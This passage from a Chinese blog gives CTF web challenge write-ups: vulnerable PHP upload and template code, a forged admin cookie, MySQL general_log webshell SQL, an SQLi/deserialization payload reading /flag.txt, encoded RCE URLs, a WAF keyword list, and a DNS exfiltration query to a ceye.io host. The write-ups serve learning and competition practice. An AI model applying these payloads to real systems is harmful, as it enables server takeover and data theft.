class="line">			<span class="comment">// Remove temp file if it is older than the max age and is not the current file</span></span><br><span class="line">			<span class="keyword">if</span> (@filemtime($tmpfilePath) &lt; time() - $maxFileAge) &#123;</span><br><span class="line">				@unlink($tmpfilePath);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		closedir($dir);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$src = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"#^data:image/(\w+);base64,(.*)$#"</span>, $src, $matches)) &#123;</span><br><span class="line">		$previewUrl = sprintf(</span><br><span class="line">				<span class="string">"%s://%s%s"</span>,</span><br><span class="line">				<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTPS'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTPS'</span>] != <span class="string">'off'</span> ? <span class="string">'https'</span> : <span class="string">'http'</span>,</span><br><span class="line">				$_SERVER[<span class="string">'HTTP_HOST'</span>],$_SERVER[<span class="string">'REQUEST_URI'</span>]</span><br><span class="line">		);</span><br><span class="line">		$previewUrl = str_replace(<span class="string">"preview.php"</span>, <span class="string">""</span>, $previewUrl);</span><br><span class="line">		$base64 = $matches[<span class="number">2</span>];</span><br><span class="line">		$type = $matches[<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">if</span> ($type === <span class="string">'jpeg'</span>) &#123;</span><br><span class="line">			$type = <span class="string">'jpg'</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strtolower($type)==<span class="string">'php'</span>)&#123;</span><br><span class="line">		    <span class="keyword">die</span>(<span class="string">'hacked!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		$filename = md5($base64).<span class="string">".$type"</span>;</span><br><span class="line">		$filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (file_exists($filePath)) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$data = base64_decode($base64);</span><br><span class="line">			file_put_contents($filePath, $data);</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "un recoginized source"&#125;&#125;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在漏洞的原因是…检测后缀太少了，就检测个php,有点像web2的那个附件上传的检测，有点虚假</p>
<p>代码大概逻辑：</p>
<p>首先建立下文件储存的preview文件夹</p>
<p>通过php://input，接受通过data协议传进来的文件，并且这个判断中判断了php，随便换成phtml或者其他的就行，最终写入previeww文件夹下，访问拿到shell,看先知的wp说后台存在弱口令，进去同样的文件上传漏洞，这里就不赘述了。</p>
<h3 id="粤湾投资"><a href="#粤湾投资" class="headerlink" title="粤湾投资"></a>粤湾投资</h3><p>emmm..比赛的时候还真没看见log的泄露orz..，这题存在传统的display的问题…（出题人的后门</p>
<p>Home\JqueryController.class.php中index函数</p>
<h4 id="display后门"><a href="#display后门" class="headerlink" title="display后门"></a>display后门</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">JqueryController</span> <span class="keyword">extends</span> <span class="title">CommonController</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 首页</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'template_file'</span>])) &#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;seoData = <span class="keyword">array</span>(<span class="string">'title'</span> =&gt; <span class="string">'Jquery插件'</span>, <span class="string">'keywords'</span> =&gt; <span class="string">'Jquery插件'</span>, <span class="string">'description'</span> =&gt; <span class="string">'Jquery插件'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;display();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;display($_GET[<span class="string">'template_file'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>明显可以通过控制template_file去调用display拿到文件的内容返回</p>
<p>调用链为：display-&gt;Home\display-&gt;parseTemplate-&gt;view\display-&gt;fetch-&gt;listen-&gt;run-&gt;fetch-&gt;loadTemplate-&gt;compiler-&gt;put-&gt;load(PS:这是代码执行的调用)</p>
<p>调用链中还是少了几步的，写的是一些相对关键的调用</p>
<h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h4><p>Home\Controller\UploadfileController.class.php 中 index函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(IS_POST)&#123;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">		 * 1、如果是图片直接调用uploadPhoto()</span></span><br><span class="line"><span class="comment">		 * 2、如果是替他附件则按照当前配置设置</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		$type = I(<span class="string">'post.type'</span>,<span class="string">'files'</span>);</span><br><span class="line">		$saveDir = I(<span class="string">'post.savedir'</span>);</span><br><span class="line">		$thumbw = I(<span class="string">'post.thumbw'</span>);</span><br><span class="line">		$thumbh = I(<span class="string">'post.thumbh'</span>);</span><br><span class="line">		$filesize = I(<span class="string">'post.filesize'</span>);</span><br><span class="line">		<span class="keyword">if</span>($type == <span class="string">'images'</span> || preg_match(<span class="string">'/^image\//'</span>, $_FILES[<span class="string">'Filedata'</span>][<span class="string">'type'</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">			$type = <span class="string">"images"</span>;</span><br><span class="line">			<span class="comment">//是否添加水印</span></span><br><span class="line">			$water = I(<span class="string">'post.water'</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>($water)&#123;</span><br><span class="line">				$water_site = C(<span class="string">'SITE_SYSTEM_IMG_WATER'</span>);</span><br><span class="line">				$water_new = <span class="keyword">isset</span>($water_site) &amp;&amp; !<span class="keyword">empty</span>($water_site) ? $water_site : C(<span class="string">'SYSTEM_IMG_WATER'</span>);</span><br><span class="line">			    <span class="comment">//$info = uploadPhoto('photo/'.$type.'',$thumbw,$thumbh,array('open'=&gt;1));</span></span><br><span class="line">				$info = uploadPhoto($saveDir.<span class="string">'/'</span>.$type,$thumbw,$thumbh,$water_new,$filesize);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$info = uploadPhoto($saveDir.<span class="string">'/'</span>.$type,$thumbw,$thumbh,<span class="string">''</span>,$filesize);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(!is_array($info))&#123;</span><br><span class="line">				$error_data[<span class="string">'info'</span>] = $info;</span><br><span class="line">				$error_data[<span class="string">'status'</span>] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;ajaxReturn($error_data);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$file[<span class="string">'oringinal_type'</span>] = <span class="string">'images'</span>;</span><br><span class="line">			$file[<span class="string">'status'</span>] = <span class="number">1</span>;</span><br><span class="line">			$file[<span class="string">'name'</span>] = $_FILES[<span class="string">'Filedata'</span>][<span class="string">'name'</span>][<span class="number">0</span>];</span><br><span class="line">			$file[<span class="string">'savename'</span>] = $info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">			$file[<span class="string">'photo'</span>] = substr($info[<span class="number">0</span>][<span class="string">'savepath'</span>],<span class="number">1</span>).$info[<span class="number">0</span>][<span class="string">'savename'</span>];</span><br><span class="line">			$file[<span class="string">'thumb'</span>] = $info[<span class="number">0</span>][<span class="string">'thumbpath'</span>];</span><br><span class="line">			$file[<span class="string">'location'</span>] = <span class="string">'upload'</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;ajaxReturn($file);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$type = <span class="string">'files'</span>;</span><br><span class="line">			$upload = <span class="keyword">new</span> \Think\Upload();</span><br><span class="line">			$upload-&gt;maxSize = $filesize*<span class="number">1024</span>; <span class="comment">//文件上传的最大文件大小，附件最大100M</span></span><br><span class="line">			$upload-&gt;rootPath = <span class="string">"./"</span>; <span class="comment">//文件上传保存的根路径</span></span><br><span class="line">			$upload-&gt;savePath = $upload-&gt;rootPath.<span class="string">"Public/Uploads/"</span>.$saveDir.<span class="string">"/"</span> . $type .<span class="string">"/"</span>;<span class="comment">//文件上传的保存路径</span></span><br><span class="line">			$upload-&gt;saveName = date(<span class="string">"YmdHis"</span>).<span class="string">"_"</span>.uniqid(); <span class="comment">//上传文件的保存规则</span></span><br><span class="line">			$upload-&gt;replace = <span class="keyword">true</span>; <span class="comment">//存在同名文件是否是覆盖</span></span><br><span class="line">			$upload-&gt;autoSub = <span class="keyword">true</span>;<span class="comment">//自动使用子目录保存上传文件</span></span><br><span class="line">			$upload-&gt;subName = date(<span class="string">"Ymd"</span>);<span class="comment">//子目录创建方式，采用数组或者字符串式定义</span></span><br><span class="line">			$upload-&gt;hash = <span class="keyword">true</span>;<span class="comment">//是否生成文件的hash编码 默认为true</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span>(!$info = $upload-&gt;upload())&#123;</span><br><span class="line">				$error_data[<span class="string">'status'</span>] = <span class="number">0</span>;方</span><br><span class="line">				$error_data[<span class="string">'info'</span>] = $upload-&gt;getError();</span><br><span class="line">				<span class="keyword">$this</span>-&gt;ajaxReturn($error_data);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">//处理文件图标</span></span><br><span class="line">				<span class="comment">//excel</span></span><br><span class="line">				<span class="keyword">if</span>(in_array($info[<span class="number">0</span>][<span class="string">'ext'</span>], <span class="keyword">array</span>(<span class="string">'xls'</span>,<span class="string">'xlsx'</span>)))&#123;</span><br><span class="line">					$info[<span class="number">0</span>][<span class="string">'ext'</span>] = <span class="string">'xls'</span>;</span><br></pre></td></tr></table></figure>

<p>两种上传操作，第一种是为了图片的上传，第二种是其他文件的上传，没有任何过滤，不过比赛的时候这道题的路由错了….，改下路由即可上传拿到shell</p>
<h3 id="粤湾期货"><a href="#粤湾期货" class="headerlink" title="粤湾期货"></a>粤湾期货</h3><h4 id="重装-后台getshell-非预期"><a href="#重装-后台getshell-非预期" class="headerlink" title="重装+后台getshell(非预期)"></a>重装+后台getshell(非预期)</h4><p>存在install.php，重装后进入后台，有多种途径可getshell</p>
<h4 id="cookie伪造-后台getshell-预期"><a href="#cookie伪造-后台getshell-预期" class="headerlink" title="cookie伪造+后台getshell(预期)"></a>cookie伪造+后台getshell(预期)</h4><p>官方做法：</p>
<p>/admin/plugin.php</p>
<p>伪造：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">EM_AUTHCOOKIE_W5ybaCEXHdrHWkYBR6bvBATPe8K9inQP=admin%7C%7Ce13aca594aae3d6240938911ac7257f7;</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<p>然后在后台系统，插件管理处可以上传压缩包格式的插件，需要上传文件夹名和文件名相同的内容的压缩包，而且是 php 文件，因此可以构造以下形式的压缩包上传生成后门然后访问/content/plugins/1/1.php，读取flag：</p>
<h3 id="粤湾租赁"><a href="#粤湾租赁" class="headerlink" title="粤湾租赁"></a>粤湾租赁</h3><p>挺伤的一道题…弱密码进去之后就是巅峰极客的操作..这场比赛没了burp可真难受</p>
<p>常规操作</p>
<h4 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set <span class="keyword">global</span> general_log = <span class="string">"ON"</span>;</span><br><span class="line">set <span class="keyword">global</span> general_log_file=<span class="string">'/var/www/html/shell.php'</span>;</span><br></pre></td></tr></table></figure>

<h4 id="sqli-反序列化"><a href="#sqli-反序列化" class="headerlink" title="sqli+反序列化"></a>sqli+反序列化</h4><p>cookie头中ECSCP[lastfilter]存在反序列化漏洞</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">16</span>:<span class="string">"composite_status"</span>;s:<span class="number">86</span>:<span class="string">"1'and(extractvalue(1,concat(0x7e,substr((select load_file('/flag.txt')),1,16),0x7e)))#"</span>;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="后台语言配置处可写shell"><a href="#后台语言配置处可写shell" class="headerlink" title="后台语言配置处可写shell"></a>后台语言配置处可写shell</h4><p>admin\languages\zh_cn\common.php</p>
<p><a href="https://imgchr.com/i/MxyhE8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/26/MxyhE8.md.png" alt="MxyhE8.md.png"></a></p>
<p>写一个shell语句，访问common.php拿到shell</p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>希望可以快速调整好状态，加油！</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BalsnCTF2019+巅峰极客复现</title>
    <url>/2019/10/27/BalsnCTF2019-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个比赛是在国庆那几天举行的..那几天发烧了orz..不过后来听师傅们说题目挺好的，所以来复现一下。</p>
<p>巅峰极客的话是因为当时没做出来，所以来复现一下。</p>
<h3 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h3><p>感觉是一道很有趣的题了，不过开始整理代码格式….和那一堆颜文字看的真是头疼…</p>
<p>我直接看的tr1ple师傅整理好的代码233,代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($secret = base64_decode(str_rot13(<span class="string">"CTygMlOmpz"</span> . <span class="string">"Z9VaSkYzcjMJpvCt=="</span>)))</span><br><span class="line">    &amp;&amp; highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line">    &amp;&amp; (<span class="keyword">include</span>(<span class="string">"config.php"</span>))</span><br><span class="line">    &amp;&amp; ($op = @$_GET[<span class="string">'op'</span>])</span><br><span class="line">    &amp;&amp; (@strlen($op) &lt; <span class="number">3</span> &amp;&amp; @($op + <span class="number">8</span>) &lt; <span class="string">'A_A'</span>)) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">'Σ&gt;―(#°ω°#)♡→'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">        || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">        || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>($secret);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    @curl_setopt(</span><br><span class="line">        $ch,</span><br><span class="line">        CURLOPT_URL,</span><br><span class="line">        str_repLace(</span><br><span class="line">            <span class="string">"int"</span>,</span><br><span class="line">            <span class="string">":DD"</span>,</span><br><span class="line">            str_repLace(</span><br><span class="line">                <span class="string">"%69%6e%74"</span>, <span class="comment">//int</span></span><br><span class="line">                <span class="string">"XDDD"</span>,</span><br><span class="line">                str_repLace(</span><br><span class="line">                    <span class="string">"%2e%2e"</span>, <span class="comment">//..</span></span><br><span class="line">                    <span class="string">"Q___Q"</span>,</span><br><span class="line">                    str_repLace(</span><br><span class="line">                        <span class="string">".."</span>,</span><br><span class="line">                        <span class="string">"QAQ"</span>,</span><br><span class="line">                        str_repLace(</span><br><span class="line">                            <span class="string">"%33%33%61"</span>, <span class="comment">//33a</span></span><br><span class="line">                            <span class="string">"&gt;__&lt;"</span>,</span><br><span class="line">                            str_repLace(</span><br><span class="line">                                <span class="string">"%63%3a"</span>, <span class="comment">//c:</span></span><br><span class="line">                                <span class="string">"WTF"</span>,</span><br><span class="line">                                str_repLace(</span><br><span class="line">                                    <span class="string">"633a"</span>, </span><br><span class="line">                                    <span class="string">":)"</span>,</span><br><span class="line">                                    str_repLace(</span><br><span class="line">                                        <span class="string">"433a"</span>,</span><br><span class="line">                                        <span class="string">":("</span>,</span><br><span class="line">                                        str_repLace(</span><br><span class="line">                                            <span class="string">"\x63:"</span>,</span><br><span class="line">                                            <span class="string">"ggininder"</span>,</span><br><span class="line">                                            strtolower(<span class="keyword">eval</span>(<span class="string">"return $_;"</span>))</span><br><span class="line">                                        )</span><br><span class="line">                                    )</span><br><span class="line">                                )</span><br><span class="line">                            )</span><br><span class="line">                        )</span><br><span class="line">                    )</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">    @curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">    @curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">1</span>);</span><br><span class="line">    @curl_EXEC($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">    $_ = @$_GET[<span class="string">''</span>];  <span class="comment"># \u2063</span></span><br><span class="line">    <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">    <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">        || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">        || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>($secret);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>($secret) &amp;&amp; system($_GET[<span class="number">0x9487945</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从题目来看，有三条路</p>
<p><strong>首先来看第一个if条件，限制条件如下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[\x00-!\'0-9"`&amp;$.,|^[&#123;_zdxfegavpos\x7F]+/i'</span>, $_)</span><br><span class="line">    || @strlen(count_chars(strtolower($_), <span class="number">3</span>)) &gt; <span class="number">13</span></span><br><span class="line">    || @strlen($_) &gt; <span class="number">19</span>) &#123;</span><br></pre></td></tr></table></figure>

<p>经历过限制后，再经过一堆replace后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl strtolower(eval(&quot;return $_;&quot;))</span><br></pre></td></tr></table></figure>

<p>最终不显示curl的结果，也就是无回显的curl</p>
<p><strong>接下来看else if</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (@strlen($op) &lt; <span class="number">4</span> &amp;&amp; @($op + <span class="number">78</span>) &lt; <span class="string">'A__A'</span>) &#123;</span><br><span class="line">   $_ = @$_GET[<span class="string">''</span>];  <span class="comment"># \u2063</span></span><br><span class="line">   <span class="comment">//http://warmup.balsnctf.com/?%E2%81%A3=index.php%20&amp;op=-79</span></span><br><span class="line">   <span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">       || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\""</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\x3e"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos($_, <span class="string">"\x3c"</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">       || (stripos(strtolower($_), <span class="string">"amp"</span>) !== <span class="keyword">FALSE</span>))</span><br><span class="line">       <span class="keyword">die</span>($secret);</span><br></pre></td></tr></table></figure>

<p>又是经过上面一堆过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (stripos($_, <span class="string">".."</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>($secret);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($_, <span class="string">"\x24"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>($secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            print_r(substr(@file_get_contents($_), <span class="number">0</span>, <span class="number">155</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后限制了跳转目录，然后通过file_get_contents取出固定长度的文件内容。</p>
<p>这里有两条路可以走，我们先看第一个的if</p>
<p>过滤了<code>{[^</code>，这就说明了我们无法拿到$_GET之类的shell，也不能通过异或拿到shell，但是括号没过滤，我们可以通过取反拿到字符，比如phpinfo()，从phpinfo()中可以看到很关键的一点信息，这是个windows的服务器</p>
<p><img src="https://s2.ax1x.com/2019/10/25/KagH58.png" alt="KagH58.png"></p>
<p>看文件是有这个config.php是被包含进来的，这种config.php一般都会有敏感信息的</p>
<p>如果直接去读readfile(config.php)肯定是不行的，不同的字符超过了十三个，看到国外大佬用短文件名去读文件内容，膜</p>
<p>Payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;warmup.balsnctf.com&#x2F;?%CE%A3%3E%E2%80%95(%23%C2%B0%CF%89%C2%B0%23)%E2%99%A1%E2%86%92&#x3D;%28%7E%8D%9A%9E%9B%99%96%93%9A%29%28%7E%9C%90%C3%C3%29&amp;op&#x3D;-9</span><br></pre></td></tr></table></figure>

<p>拿到文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    <span class="comment">// THIS IS THE CONFIG OF THE MYSQL DB</span></span><br><span class="line">    <span class="comment">// ***********************************</span></span><br><span class="line">    $host = <span class="string">"localhost"</span>;</span><br><span class="line">    $user = <span class="string">"admin"</span>;</span><br><span class="line">    $pass = <span class="string">""</span>;</span><br><span class="line">    $port = <span class="number">8787</span>;</span><br><span class="line">    <span class="comment">// hint:flag-is-in-the-database XDDDDDDD</span></span><br><span class="line">    <span class="comment">// ====================================</span></span><br><span class="line">    set_time_limit(<span class="number">1</span>);</span><br><span class="line">    ini_set(<span class="string">'mysql.connect_timeout'</span>,<span class="string">'1'</span>);</span><br><span class="line">    ini_set(<span class="string">'max_execution_time'</span>, <span class="string">'1'</span>);</span><br></pre></td></tr></table></figure>

<p>这里给了一些Mysql的配置信息，并且告诉了flag的位置，那就是gopher配合curl盲打mysql了。</p>
<p><strong>在gopher之前，我们还得说一下第二条路的解法</strong></p>
<p>主要过滤为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'.php'</span>)</span><br><span class="line">    || (strtolower(substr($_, <span class="number">-4</span>)) === <span class="string">'php.'</span>)</span><br></pre></td></tr></table></figure>

<p>由于这是windows服务器，虽然他过滤了一个php.，但是我们还有一个php+空格，这里长度的问题，可以通过压缩解决</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$content = file_get_contents(<span class="string">"http://warmup.balsnctf.com/?op=-99&amp;%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20"</span>);</span><br><span class="line"></span><br><span class="line">$idx = stripos($content, <span class="string">"&lt;/code&gt;"</span>) + <span class="number">7</span>; <span class="comment">//code后面的数据即为压缩数据</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"/tmp/233"</span>, substr($content, $idx));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"php://filter/zlib.inflate/resource=/tmp/233"</span>);</span><br></pre></td></tr></table></figure>

<p><strong>对一个漏洞的利用还是有很多种的，比如这里利用windows对1.php.和1.php空格的处理，在访问或者上传的时候，都会将后面的符号删除进行处理</strong></p>
<p><strong>最后接着来说gopher盲打mysql</strong></p>
<p>这是一个没有回显的ssrf,直接放进去gopher的payload肯定放不进去，所以这里可以再回到之前的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getenv(&quot;HTTP_T&quot;)</span><br></pre></td></tr></table></figure>

<p>不过这里我们看到在config.php种限定了执行时间，所以没法盲注，不过可以通过dns外带拿到数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(version()),&#39;.mysql.ztfjd8.ceye.io\\abc&#39;));</span><br></pre></td></tr></table></figure>

<p>通过gopher生成payload放到http头</p>
<p><img src="https://s2.ax1x.com/2019/10/25/Kaqt1I.png" alt="Kaqt1I.png"></p>
<p><img src="https://s2.ax1x.com/2019/10/25/KaqrNQ.png" alt="KaqrNQ.png"></p>
<p>接下来拿flag的过程也就是正常的注入过程了。</p>
<p>需要注意的是规避特殊符号和长度限制，特殊符号可以用hex解决，长度限制可以用substr解决。</p>
<h3 id="KoreaFish"><a href="#KoreaFish" class="headerlink" title="KoreaFish"></a>KoreaFish</h3><p>同样是很有趣的题了，php+python的一个web，考点是Dns重绑定攻击，SSTI注入</p>
<p>index.php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;KoreaFish&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;form action=<span class="string">"/"</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"🇰🇷🐟"</span> placeholder=<span class="string">"http://54.87.54.87/koreafish?id=1"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'default_socket_timeout'</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$waf = <span class="keyword">array</span>(<span class="string">"@"</span>,<span class="string">"#"</span>,<span class="string">"!"</span>,<span class="string">"$"</span>,<span class="string">"%"</span>,<span class="string">"&lt;"</span>, <span class="string">"*"</span>, <span class="string">"'"</span>, <span class="string">"&amp;"</span>, <span class="string">".."</span>, <span class="string">"localhost"</span>, <span class="string">"file"</span>, <span class="string">"gopher"</span>, <span class="string">"flag"</span>, <span class="string">"information_schema"</span>, <span class="string">"select"</span>, <span class="string">"from"</span>, <span class="string">"sleep"</span>, <span class="string">"user"</span>, <span class="string">"where"</span>, <span class="string">"union"</span>, <span class="string">".php"</span>, <span class="string">"system"</span>, <span class="string">"access.log"</span>, <span class="string">"passwd"</span>, <span class="string">"cmdline"</span>, <span class="string">"exe"</span>, <span class="string">"fd"</span>, <span class="string">"meta-data"</span>);</span><br><span class="line"></span><br><span class="line">$dst = @$_GET[<span 